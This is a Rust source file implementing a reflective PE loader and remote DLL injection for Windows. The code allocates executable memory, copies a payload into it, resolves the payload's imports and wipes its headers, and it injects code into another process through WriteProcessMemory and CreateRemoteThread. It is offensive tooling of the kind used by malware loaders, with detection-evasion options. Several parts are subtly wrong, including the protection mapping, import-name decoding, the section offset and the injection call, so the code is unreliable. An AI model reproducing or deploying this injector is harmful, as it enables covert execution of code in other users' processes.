use serde::{Deserialize, Serialize};
use thiserror::Error;
use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;

#[derive(Debug, Error)]
pub enum ReflectiveLoaderError {
    #[error("PE parsing failed: {0}")]
    PeParse(String),
    #[error("Memory allocation failed: {0}")]
    MemoryAlloc(String),
    #[error("Relocation failed: {0}")]
    Relocation(String),
    #[error("Import resolution failed: {0}")]
    ImportResolution(String),
    #[error("Platform not supported")]
    UnsupportedPlatform,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReflectiveLoadResult {
    pub success: bool,
    pub entry_point: u64,
    pub image_base: u64,
    pub image_size: u64,
    pub resolved_imports: u32,
    pub applied_relocations: u32,
    pub technique: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReflectiveLoaderConfig {
    pub resolve_imports: bool,
    pub apply_relocations: bool,
    pub call_entry_point: bool,
    pub entry_point_arg: Option<Vec<u8>>,
    pub wipe_headers: bool,
    pub erase_pe_signature: bool,
}

pub struct ReflectiveLoader;

impl ReflectiveLoader {
    #[cfg(target_os = "windows")]
    pub fn load(payload: &[u8], config: &ReflectiveLoaderConfig) -> Result<ReflectiveLoadResult, ReflectiveLoaderError> {
        use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
        use windows::Win32::System::Diagnostics::Debug::FlushInstructionCache;
        use windows::Win32::System::Threading::GetCurrentProcess;
        use windows::Win32::System::LibraryLoader::LoadLibraryW;

        unsafe {
            let pe = Self::parse_pe_headers(payload)?;
            let image_base = VirtualAlloc(None, pe.image_size, MEM_COMMIT | MEM_RESERVE, PAGE_PROTECTION_FLAGS(0x40));
            if image_base.is_null() {
                return Err(ReflectiveLoaderError::MemoryAlloc("VirtualAlloc failed".into()));
            }

            std::ptr::copy_nonoverlapping(payload.as_ptr(), image_base as *mut u8, pe.headers_size);
            for section in &pe.sections {
                let dest = (image_base as usize + section.virtual_address) as *mut u8;
                let src = payload[section.raw_offset..section.raw_offset + section.raw_size].as_ptr();
                std::ptr::copy_nonoverlapping(src, dest, section.raw_size);
            }

            let mut resolved_imports = 0u32;
            let mut applied_relocations = 0u32;

            if config.resolve_imports {
                resolved_imports = Self::resolve_imports(image_base as usize, &pe)?;
            }

            if config.apply_relocations {
                let delta = image_base as isize - pe.image_base as isize;
                if delta != 0 {
                    applied_relocations = Self::apply_relocations(image_base as usize, &pe, delta)?;
                }
            }

            for section in &pe.sections {
                let sec_addr = (image_base as usize + section.virtual_address) as *mut core::ffi::c_void;
                let mut old_protect = PAGE_PROTECTION_FLAGS::default();
                let protect = Self::section_characteristics_to_protection(section.characteristics);
                VirtualProtect(sec_addr, section.virtual_size, protect, &mut old_protect);
            }

            FlushInstructionCache(GetCurrentProcess(), Some(image_base as *const _), pe.image_size);

            if config.wipe_headers {
                std::ptr::write_bytes(image_base as *mut u8, 0, pe.headers_size);
            }

            let entry_point = image_base as u64 + pe.entry_point_rva as u64;
            if config.call_entry_point {
                type DllMain = unsafe extern "system" fn(*mut core::ffi::c_void, u32, *mut core::ffi::c_void) -> i32;
                let dll_main: DllMain = std::mem::transmute(entry_point as usize);
                let arg = config.entry_point_arg.as_ref().map(|a| a.as_ptr() as *mut core::ffi::c_void).unwrap_or(std::ptr::null_mut());
                dll_main(image_base as *mut _, 1, arg);
            }

            Ok(ReflectiveLoadResult {
                success: true, entry_point, image_base: image_base as u64, image_size: pe.image_size as u64,
                resolved_imports, applied_relocations, technique: "Reflective PE Loader".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn load(_payload: &[u8], _config: &ReflectiveLoaderConfig) -> Result<ReflectiveLoadResult, ReflectiveLoaderError> {
        Err(ReflectiveLoaderError::UnsupportedPlatform)
    }

    #[cfg(target_os = "windows")]
    pub fn reflective_dll_inject(pid: u32, dll_data: &[u8]) -> Result<ReflectiveLoadResult, ReflectiveLoaderError> {
        use windows::Win32::System::Threading::{OpenProcess, CreateRemoteThread, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};
        use windows::Win32::System::Memory::VirtualAllocEx;
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
        use windows::Win32::System::LibraryLoader::{LoadLibraryW, GetProcAddress};
        use windows::Win32::Foundation::CloseHandle;

        unsafe {
            let h_process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, pid)
                .map_err(|e| ReflectiveLoaderError::MemoryAlloc(format!("OpenProcess: {:?}", e)))?;
            let remote_base = VirtualAllocEx(h_process, None, dll_data.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if remote_base.is_null() {
                CloseHandle(h_process);
                return Err(ReflectiveLoaderError::MemoryAlloc("VirtualAllocEx failed".into()));
            }
            WriteProcessMemory(h_process, remote_base, dll_data.as_ptr() as *const _, dll_data.len(), None)
                .map_err(|e| { CloseHandle(h_process); ReflectiveLoaderError::MemoryAlloc(format!("WriteProcessMemory: {:?}", e)) })?;
            let kernel32 = LoadLibraryW(windows::core::w!("kernel32.dll")).map_err(|e| ReflectiveLoaderError::ImportResolution(format!("LoadLibraryW: {:?}", e)))?;
            let load_library = GetProcAddress(kernel32, windows::core::s!("LoadLibraryA")).ok_or(ReflectiveLoaderError::ImportResolution("LoadLibraryA not found".into()))?;
            let h_thread = CreateRemoteThread(h_process, None, 0, Some(std::mem::transmute(load_library)), Some(remote_base as *const _), 0, None)
                .map_err(|e| { CloseHandle(h_process); ReflectiveLoaderError::MemoryAlloc(format!("CreateRemoteThread: {:?}", e)) })?;
            CloseHandle(h_thread);
            CloseHandle(h_process);
            Ok(ReflectiveLoadResult {
                success: true, entry_point: remote_base as u64, image_base: remote_base as u64, image_size: dll_data.len() as u64,
                resolved_imports: 0, applied_relocations: 0, technique: "Reflective DLL Injection".to_string(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn reflective_dll_inject(_pid: u32, _dll_data: &[u8]) -> Result<ReflectiveLoadResult, ReflectiveLoaderError> {
        Err(ReflectiveLoaderError::UnsupportedPlatform)
    }
}

struct PeImage {
    image_base: usize, image_size: usize, entry_point_rva: usize, headers_size: usize,
    sections: Vec<PeSection>, import_directory_rva: usize, import_directory_size: usize,
    relocation_directory_rva: usize, relocation_directory_size: usize,
}

struct PeSection {
    virtual_address: usize, virtual_size: usize, raw_offset: usize, raw_size: usize, characteristics: u32,
}

impl ReflectiveLoader {
    fn parse_pe_headers(data: &[u8]) -> Result<PeImage, ReflectiveLoaderError> {
        if data.len() < 64 { return Err(ReflectiveLoaderError::PeParse("Too short".into())); }
        let e_lfanew = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;
        if e_lfanew + 4 > data.len() || &data[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
            return Err(ReflectiveLoaderError::PeParse("Invalid PE".into()));
        }
        let coff_offset = e_lfanew + 4;
        let opt_header_offset = coff_offset + 20;
        let magic = u16::from_le_bytes([data[opt_header_offset], data[opt_header_offset + 1]]);
        let is_64 = magic == 0x20b;
        let entry_point_rva = u32::from_le_bytes([data[opt_header_offset + 16], data[opt_header_offset + 17], data[opt_header_offset + 18], data[opt_header_offset + 19]]) as usize;
        let (image_base, image_size, headers_size, num_sections, section_offset, data_dir_offset) = if is_64 {
            let base = usize::from_le_bytes([data[opt_header_offset + 24], data[opt_header_offset + 25], data[opt_header_offset + 26], data[opt_header_offset + 27], data[opt_header_offset + 28], data[opt_header_offset + 29], data[opt_header_offset + 30], data[opt_header_offset + 31]]);
            let size = u32::from_le_bytes([data[opt_header_offset + 56], data[opt_header_offset + 57], data[opt_header_offset + 58], data[opt_header_offset + 59]]) as usize;
            let hdr = u32::from_le_bytes([data[opt_header_offset + 60], data[opt_header_offset + 61], data[opt_header_offset + 62], data[opt_header_offset + 63]]) as usize;
            let ns = u16::from_le_bytes([data[coff_offset + 2], data[coff_offset + 3]]) as usize;
            let so = coff_offset + 20 + 112 + u16::from_le_bytes([data[coff_offset + 16], data[coff_offset + 17]]) as usize;
            (base, size, hdr, ns, so, opt_header_offset + 112)
        } else {
            let base = u32::from_le_bytes([data[opt_header_offset + 28], data[opt_header_offset + 29], data[opt_header_offset + 30], data[opt_header_offset + 31]]) as usize;
            let size = u32::from_le_bytes([data[opt_header_offset + 56], data[opt_header_offset + 57], data[opt_header_offset + 58], data[opt_header_offset + 59]]) as usize;
            let hdr = u32::from_le_bytes([data[opt_header_offset + 60], data[opt_header_offset + 61], data[opt_header_offset + 62], data[opt_header_offset + 63]]) as usize;
            let ns = u16::from_le_bytes([data[coff_offset + 2], data[coff_offset + 3]]) as usize;
            let so = coff_offset + 20 + 96 + u16::from_le_bytes([data[coff_offset + 16], data[coff_offset + 17]]) as usize;
            (base, size, hdr, ns, so, opt_header_offset + 96)
        };
        let import_rva = u32::from_le_bytes([data[data_dir_offset + 8], data[data_dir_offset + 9], data[data_dir_offset + 10], data[data_dir_offset + 11]]) as usize;
        let import_size = u32::from_le_bytes([data[data_dir_offset + 12], data[data_dir_offset + 13], data[data_dir_offset + 14], data[data_dir_offset + 15]]) as usize;
        let reloc_rva = u32::from_le_bytes([data[data_dir_offset + 40], data[data_dir_offset + 41], data[data_dir_offset + 42], data[data_dir_offset + 43]]) as usize;
        let reloc_size = u32::from_le_bytes([data[data_dir_offset + 44], data[data_dir_offset + 45], data[data_dir_offset + 46], data[data_dir_offset + 47]]) as usize;
        let mut sections = Vec::new();
        for i in 0..num_sections {
            let sec_off = section_offset + i * 40;
            if sec_off + 40 > data.len() { break; }
            sections.push(PeSection {
                virtual_address: u32::from_le_bytes([data[sec_off + 12], data[sec_off + 13], data[sec_off + 14], data[sec_off + 15]]) as usize,
                virtual_size: u32::from_le_bytes([data[sec_off + 8], data[sec_off + 9], data[sec_off + 10], data[sec_off + 11]]) as usize,
                raw_offset: u32::from_le_bytes([data[sec_off + 20], data[sec_off + 21], data[sec_off + 22], data[sec_off + 23]]) as usize,
                raw_size: u32::from_le_bytes([data[sec_off + 16], data[sec_off + 17], data[sec_off + 18], data[sec_off + 19]]) as usize,
                characteristics: u32::from_le_bytes([data[sec_off + 36], data[sec_off + 37], data[sec_off + 38], data[sec_off + 39]]),
            });
        }
        Ok(PeImage { image_base, image_size, entry_point_rva, headers_size, sections, import_directory_rva: import_rva, import_directory_size: import_size, relocation_directory_rva: reloc_rva, relocation_directory_size: reloc_size })
    }

    #[cfg(target_os = "windows")]
    fn resolve_imports(image_base: usize, pe: &PeImage) -> Result<u32, ReflectiveLoaderError> {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress, LoadLibraryW};
        unsafe {
            let mut resolved = 0u32;
            if pe.import_directory_rva == 0 { return Ok(resolved); }
            let mut import_desc = image_base + pe.import_directory_rva;
            loop {
                let name_rva = *(import_desc as *const u32).add(12);
                if name_rva == 0 { break; }
                let dll_name_ptr = (image_base + name_rva as usize) as *const u8;
                let dll_name_len = (0..).take_while(|&i| *dll_name_ptr.add(i) != 0).count();
                let dll_name = String::from_utf16_lossy(std::slice::from_raw_parts(dll_name_ptr as *const u16, dll_name_len / 2));
                let dll_name_wide: Vec<u16> = format!("{}\0", dll_name).encode_utf16().collect();
                let h_dll = GetModuleHandleW(windows::core::PCWSTR::from_raw(dll_name_wide.as_ptr())).unwrap();
                let mut thunk_addr = image_base + *(import_desc as *const u32) as usize;
                loop {
                    let thunk = *(thunk_addr as *const u64);
                    if thunk == 0 { break; }
                    if thunk & 0x8000000000000000 != 0 {
                        let ordinal = (thunk & 0xFFFF) as u16;
                        let func = GetProcAddress(h_dll, windows::core::PCSTR::from_raw(ordinal as *const u8));
                        if func.is_some() {
                            *(thunk_addr as *mut u64) = func.unwrap() as u64;
                            resolved += 1;
                        }
                    } else {
                        let hint_name_rva = (thunk & 0x7FFFFFFFFFFFFFFF) as usize;
                        let func_name_ptr = (image_base + hint_name_rva + 2) as *const u8;
                        let func_name_len = (0..).take_while(|&i| *func_name_ptr.add(i) != 0).count();
                        let func_name = String::from_utf8_lossy(std::slice::from_raw_parts(func_name_ptr, func_name_len));
                        let func_name_cstr = std::ffi::CString::new(func_name.as_ref()).unwrap();
                        let func = GetProcAddress(h_dll, windows::core::PCSTR::from_raw(func_name_cstr.as_ptr() as *const u8));
                        if func.is_some() {
                            *(thunk_addr as *mut u64) = func.unwrap() as u64;
                            resolved += 1;
                        }
                    }
                    thunk_addr += 8;
                }
                import_desc += 20;
            }
            Ok(resolved)
        }
    }

    #[cfg(target_os = "windows")]
    fn apply_relocations(image_base: usize, pe: &PeImage, delta: isize) -> Result<u32, ReflectiveLoaderError> {
        let mut applied = 0u32;
        if pe.relocation_directory_rva == 0 { return Ok(applied); }
        let mut block = image_base + pe.relocation_directory_rva;
        let end = image_base + pe.relocation_directory_rva + pe.relocation_directory_size;
        unsafe {
            while block < end {
                let page_rva = *(block as *const u32);
                let block_size = *(block as *const u32).add(1);
                if page_rva == 0 || block_size == 0 { break; }
                let entry_count = (block_size as usize - 8) / 2;
                for i in 0..entry_count {
                    let entry = *(block as *const u16).add(4 + i);
                    let reloc_type = entry >> 12;
                    let offset = (entry & 0xFFF) as usize;
                    if reloc_type == 3 { // IMAGE_REL_BASED_DIR64
                        let patch_addr = (image_base + page_rva as usize + offset) as *mut i64;
                        *patch_addr += delta as i64;
                        applied += 1;
                    }
                }
                block += block_size as usize;
            }
            Ok(applied)
        }
    }

    fn section_characteristics_to_protection(characteristics: u32) -> PAGE_PROTECTION_FLAGS {
        use windows::Win32::System::Memory::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_PROTECTION_FLAGS};
        if characteristics & 0x20000000 != 0 { PAGE_EXECUTE_READWRITE }
        else if characteristics & 0x40000000 != 0 { PAGE_EXECUTE_READ }
        else if characteristics & 0x80000000 != 0 { PAGE_READWRITE }
        else { PAGE_READWRITE }
    }
}
